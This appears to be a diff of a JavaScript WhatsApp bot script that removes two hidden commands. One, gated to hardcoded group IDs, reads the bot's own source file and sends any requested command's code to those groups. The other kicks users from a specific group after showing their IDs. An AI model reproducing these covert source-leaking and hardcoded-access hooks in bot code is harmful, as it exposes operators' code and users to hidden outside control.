@@ -6756,67 +6756,6 @@ order2 Kode Id Server [ order2 ML5 12345678 1234 ]`)
 }
 break
 // ===== AKHIR MENU TOPUP ===== //
-
-case 'minta': {
-  if (!["120363344469321945@g.us","120363419539538282@g.us"].includes(from)) return
-  if (!text) return m.reply(`Contoh: minta hd`)
-  if (text.toLowerCase() === command.toLowerCase()) return m.reply(`😊`)
-  try {
-    const caseName = text.toLowerCase()
-    const fileContent = fs.readFileSync("./lenwy.js").toString()
-    let validasii = fileContent.split(`case '${caseName}'`)
-    const caseSplit = validasii? validasii : fileContent.split(`case '${caseName}'`)
-    if (caseSplit.length < 2) {
-      throw new Error(`Case '${caseName}' tidak ditemukan.`)
-    }
-    const caseContent = caseSplit[1].split("break")[0]
-    const caseCode = "case " + `'${caseName}'` + caseContent + "break";
-    const caseRegex = /((?:case\s+'[^']+'\s*:\s*)+)\s*\{/g
-    let match, found = false
-    let startIndex = -1, endIndex = -1
-    let lastAlias = null
-    while ((match = caseRegex.exec(caseCode)) !== null) {
-      const rawCases = match[1]
-      const aliases = [...rawCases.matchAll(/case\s+'([^']+)'/g)].map(m => m[1])
-      if (aliases.includes(caseName)) {
-        found = true
-        lastAlias = aliases[aliases.length - 1]
-        startIndex = match.index
-        break
-      }
-    }
-
-    if (!found || !lastAlias) return m.reply(`Case '${caseName}' tidak ditemukan.`)
-    endIndex = caseCode.indexOf('break', startIndex)
-    if (endIndex === -1) endIndex = caseCode.length
-    const blockCode = caseCode.slice(startIndex, endIndex + 5).trim()
-    const newBlock = blockCode.replace(/^((?:case\s+'[^']+'\s*:\s*)+)\s*\{/, `case '${lastAlias}': {`)
-    m.reply(`editcase ${lastAlias}|${newBlock}`)
-  } catch (err) {
-    m.reply(`Gagal mengambil case '${text}': ${err.message}`)
-  }
-}
-break
-
-case 'id': {
-if (from != '120363404278304048@g.us') return
-if (!text) return m.reply(`Contoh: ${prefix + command} bot/aku`)
-if (text === 'bot') {
-let lidnya = lenwy.user?.lid.replace(/:\d+@/, '@')
-let idnya = lenwy.user?.id.replace(/:\d+@/, '@')
-m.reply(`Lid: ${lidnya}
-Id: ${idnya}`)
-} else if (text === 'aku') {
-m.reply(`Id: ${m.sender}`)
-} else {
-return m.reply(`Contoh: ${prefix + command} bot/aku`)
-}
-if (m.sender === "152767909896298@lid") return
-await sleep (5000)
-await lenwy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-}
-break
-
 default:
   if (budy.startsWith("=>")) {
     if (!isCreator) return m.reply('Only owner can use this command.');
